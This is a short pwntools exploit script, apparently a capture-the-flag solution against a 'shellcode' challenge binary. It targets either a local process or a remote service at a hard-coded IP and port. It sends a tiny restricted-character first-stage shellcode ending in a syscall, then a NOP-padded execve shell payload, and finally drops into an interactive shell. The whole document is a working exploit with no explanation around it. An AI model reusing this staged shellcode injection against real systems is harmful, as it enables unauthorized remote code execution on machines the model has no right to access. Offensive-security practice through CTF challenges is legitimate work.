from pwn import *
import sys

if len(sys.argv) < 2:
	p = process("./shellcode")
else:
	p = remote("34.92.37.22","10002")

def cal(chars):
	print chars + ":" + asm(chars)

def debugf():
	gdb.attach(p,"b *0x400786\nb *0x4008CB")

context.log_level = "debug"
context.terminal = ["tmux","splitw","-h"]
context.bits = 64
context.arch = "amd64"
#debugf()
print "----------------------"
cal("inc edi")
cal("pop rdi")
cal("pop rdx")
info = "ZZJ loves shell_code,and here is a gift:\x0f\x05 enjoy it!\n"
print "useable:" + info
sc = "Z_____\x0f\x05"
sc2 = asm(shellcraft.sh())
sc2 = sc2.rjust(0x100,"\x90")
p.sendafter("give me shellcode, plz:\n",sc)
raw_input()
p.send(sc2)
p.interactive()
